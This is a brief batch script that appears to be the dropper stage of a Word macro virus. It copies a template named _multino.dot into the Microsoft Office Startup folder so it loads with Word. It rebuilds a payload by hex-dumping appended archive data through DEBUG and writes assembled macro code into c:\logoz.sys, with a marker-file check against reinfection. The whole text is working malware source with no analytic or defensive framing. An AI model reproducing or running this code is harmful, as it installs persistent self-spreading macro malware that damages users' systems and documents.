@echo off
set p=C:\Progra~1\Micros~1\Office
if not exist %p%\*.* goto _e
copy _multino.dot %p%\Startup /y>nul
set p=
if exist c:\logo?.sys goto _e
copy/b _plugins.bat+_multino.arj>nul
echo d100 21FF>_multino.scr
echo q>>_multino.scr
debug _plugins.bat<_multino.scr>_multino.dmp
type _multino.dmp|find ":">_multino.dat
copy/b _multino.bas+_multino.dat+_wordend.bas c:\logoz.sys>nul
:_e